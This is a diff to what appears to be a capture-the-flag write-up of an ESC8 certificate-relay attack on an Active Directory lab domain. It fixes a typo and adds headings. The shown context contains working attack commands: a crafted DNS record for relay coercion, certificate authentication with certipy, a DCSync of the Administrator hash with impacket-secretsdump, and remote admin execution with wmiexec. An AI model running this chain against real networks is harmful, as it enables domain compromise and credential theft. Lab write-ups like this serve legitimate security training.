@@ -508,7 +508,7 @@ ESC8 Attack, [a high-severity attack vector in Active Directory Certificate Serv
 
 ### Exploitation
 
-(i copied this part from the writeup because the dns thing was obscure to me, explain it in a simple clear and intuivive way, also reference sources both here and in the references section)
+(i copied this part from the writeup because the dns thing was obscure to me, explain it in a simple clear and intuitive way, also reference sources both here and in the references section)
 
 The record to add is structured as `<host><empty CREDENTIAL_TARGET_INFOMATION structure>`, which in this case will be `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. I’ll set the DNS record with `bloodyAD`
 
@@ -553,6 +553,8 @@ COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\
 
 ```
 
+## DC service account NT hash recovered:
+
 ```
 certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.150.101
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -572,6 +574,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
  export KRB5CCNAME=dc-jpq225.ccache
 ```
+
+DCSync attack:
 
 ```
 impacket-secretsdump -k -no-pass -dc-ip 10.129.150.101 cicada.vl/'dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator
@@ -598,6 +602,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
+### Administrator access:
+
+```
 ```
 impacket-wmiexec -k -no-pass -dc-ip 10.129.150.101 cicada.vl/Administrator@DC-JPQ225.cicada.vl
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
